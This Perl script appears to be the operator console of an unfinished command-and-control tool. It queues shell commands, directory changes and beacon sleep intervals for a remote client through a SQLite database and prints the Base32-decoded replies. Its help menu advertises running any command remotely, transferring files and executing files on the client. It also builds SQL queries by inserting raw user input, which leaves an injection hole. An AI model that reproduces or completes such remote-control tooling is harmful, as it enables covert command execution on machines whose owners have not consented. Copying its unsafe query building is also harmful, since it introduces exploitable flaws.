#!/usr/bin/perl
###############################
# To Do
# * Check to see if outbound MSG QUEUE has enteries and append users's cmd
# * Learn how to run once
# * Check buff sizes both inbound / outbound (MAX 4096)
# * Get CWD & change prompt 
# * Get Hostname
# * Capture ^C
#
###############################
# Known bugs
#
###############################
use warnings;
use strict;
use DBI;
use MIME::Base32 qw ( RFC );

###############################
# Global Variables            #
###############################
my $debug;
my $client_id;
my $hostname;

###############################
# Parse User Arguments	      #
###############################
foreach(@ARGV) {
        if ($_ eq "-d") {
                $debug = 1;
        }
	elsif($_ =~ /--id=(.*)/){
		$client_id = $1;	
	}
}

###############################
# Sub Routines		      #
###############################

sub debug {
	if ($debug) {
                print "$_[0] => $_[1]\n";
        }
}

sub parse_cmd {
	my $typed_cmd = $_[0];
	if ($typed_cmd =~ /^help$/i) {
		help();
		return 0;
	} elsif($typed_cmd =~ /^upload (.*) (.*)/) {
		#upload();
		print "NOT IMPLEMENTED YET\n";
		return 0
	} elsif($typed_cmd =~ /^download (.*) (.*)/) {
		#download();
		print "NOT IMPLEMENTED YET\n";
		return 0;
	} elsif($typed_cmd =~ /^sleep (\d+)/) {
		#client_sleep();
		my $sleep_value = $1;
		if($sleep_value > 0 && $sleep_value < 65536) {
			send_msg($1, "SLEEP");
			return 1;
		} else {
			print "Value must be between 1-65535\n";
			return 0;
		}
	} elsif($typed_cmd =~ /^exec (.*)/) {
		#client_exec();
		print "NOT IMPELEMNTED YET\n";
		return 0;
	} elsif($typed_cmd =~ /^cd (.*)/i) {
 		send_msg($1, "CWD");
		return 1;
	} elsif($typed_cmd =~ /debug (.*)/i) {
		if ($1 =~ /on/i) {
			$debug = 1;
		} elsif ($1 =~ /off/i) {
			$debug = 0;
		} else {
			print "Value must be either ON or OFF.\n";
		}
		return 0;
	} else {
		send_msg($typed_cmd, "CMD");
		return 1;
	}
}

sub help {
	print "Available Commands:\tArguments\tDescription\n";
	print "#######################################################################################################################\n";
	print "  [cmd]\t\t\t[args]\t\tType any command, like whoami, hostname, etc.\n";
	print "  upload\t\t[src] [dst]\tUploads a file [src] to [dst]. Type full path.\n";
	print "  download\t\t[src] [dst]\tDownloads a file [src] to [dst]. Type full path.\n";
	print "  sleep\t\t\t[1...65535]\tSet the client to only check in ever x seconds.\n";
	print "  exec\t\t\t[file]\t\tExecutes a file as a seperate proccess.\n";
	print "  debug\t\t\t[on|off]\tEnables or Disables debug messaging to console.\n";
	print "  help\t\t\t\t\tDisplays this menu.\n";
	print "#######################################################################################################################\n";
}

sub recieve_msg {
	my $return = 0;
	my $client_cmd = "";
	# check command

	my $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
        my $sth = $dbh->prepare("SELECT CLIENT_CMD FROM cmd_queue");
        $sth->execute();

	my @row = $sth->fetchrow_array();
        if (length($row[0]) >  0) {
		$client_cmd = $row[0];
        }

        $sth = $dbh->prepare("UPDATE cmd_queue SET CLIENT_CMD='NULL'");
        $sth->execute();
        $sth->finish();
        $dbh->disconnect();

	if ($client_cmd eq "UPLOAD") {
		debug("CLIENT COMMAND", $client_cmd);
	} elsif ($client_cmd eq "DOWNLOAD") {
                debug("CLIENT COMMAND", $client_cmd);
	} elsif ($client_cmd eq "SLEEP") {
                debug("CLIENT COMMAND", $client_cmd);
                $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
                $sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
                $sth->execute();

                my @row = $sth->fetchrow_array();
                if (length($row[0]) >  0) {
                        if (($row[0] ne "NULL") && (MIME::Base32::decode($row[0]) ne "NULL")) { # JBEQ = NULL
                                debug("ENTRY", MIME::Base32::decode($row[0]));
                                $return = MIME::Base32::decode($row[0]);
                        }
                }
                #print "CLIENT_MSG_QUEUE: $row[0]\n";
                debug("CLIENT_MSG_QUEUE", "CLEARED");
                $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
                $sth->execute();
                $sth->finish();
                $dbh->disconnect();
                return $return;
	
	} elsif ($client_cmd eq "EXEC") {
                debug("CLIENT COMMAND", $client_cmd);
	} elsif ($client_cmd eq "CMD") {
                debug("CLIENT COMMAND", $client_cmd);
		$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
        	$sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
        	$sth->execute();

	        my @row = $sth->fetchrow_array();
        	if (length($row[0]) >  0) {
                	if (($row[0] ne "NULL") && (MIME::Base32::decode($row[0]) ne "NULL")) { # JBEQ = NULL
                        	debug("ENTRY", MIME::Base32::decode($row[0]));
	                        $return = MIME::Base32::decode($row[0]);
        	        }
	        }
        	#print "CLIENT_MSG_QUEUE: $row[0]\n";
		debug("CLIENT_MSG_QUEUE", "CLEARED");
	        $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
        	$sth->execute();
	        $sth->finish();
        	$dbh->disconnect();
	        return $return;

	} elsif ($client_cmd eq "CWD") { 
		debug("CLIENT COMMAND", $client_cmd);
                $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
                $sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
                $sth->execute();

                my @row = $sth->fetchrow_array();
                if (length($row[0]) >  0) {
                        if (($row[0] ne "NULL") && (MIME::Base32::decode($row[0]) ne "NULL")) { # JBEQ = NULL
                                debug("ENTRY", MIME::Base32::decode($row[0]));
                                $return = MIME::Base32::decode($row[0]);
                        }
                }
                #print "CLIENT_MSG_QUEUE: $row[0]\n";
                debug("CLIENT_MSG_QUEUE", "CLEARED");
                $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
                $sth->execute();
                $sth = $dbh->prepare("UPDATE cmd_queue SET CLIENT_CMD='NULL'");
                $sth->execute();

		$sth->finish();
                $dbh->disconnect();
                return $return;
	
	}elsif ($client_cmd eq "NULL") {
		return 0;
	} else {
                debug("INVALID CLIENT CMD", $client_cmd);
		die;
	}
}

sub send_msg {
	my $msg = $_[0];
	my $cmd = $_[1];
	debug("Queuing srv msg", $msg);
	my $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
        my $sth = $dbh->prepare("UPDATE msg_queue SET SERVER_MSG_QUEUE='$msg'");
        $sth->execute();
        $sth->finish();
        $dbh->disconnect();

	debug("Queuing srv cmd", $cmd);
	$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
        $sth = $dbh->prepare("UPDATE cmd_queue SET SERVER_CMD='$cmd'");
        $sth->execute();
        $sth->finish();
        $dbh->disconnect();
}

sub shell{ 
	my $rsp = "";
	my $wait_for_rsp = 0;
	while(1) {
		use Term::Prompt;
		$rsp = recieve_msg();
		if ($rsp) {
			print "$rsp\n";
			$wait_for_rsp = 0;
		} elsif (!$wait_for_rsp) {
			my $cmd = prompt('x', "SHELL>", '', '');
			$wait_for_rsp = parse_cmd($cmd);
			#send_msg($cmd);
			#$wait_for_rsp = 1;
		} else {
			sleep 1;
		}
		
		# Wait untill response?
		#recieve_msg();
		#print "SHELL>";
		#chomp(my $cmd = <STDIN>);
		#send_msg($cmd);
		#sleep 1;
	}
}
###############################
# Main			      #
###############################
shell();
#recieve_msg();
#send_msg("MSG FROM SERVER");
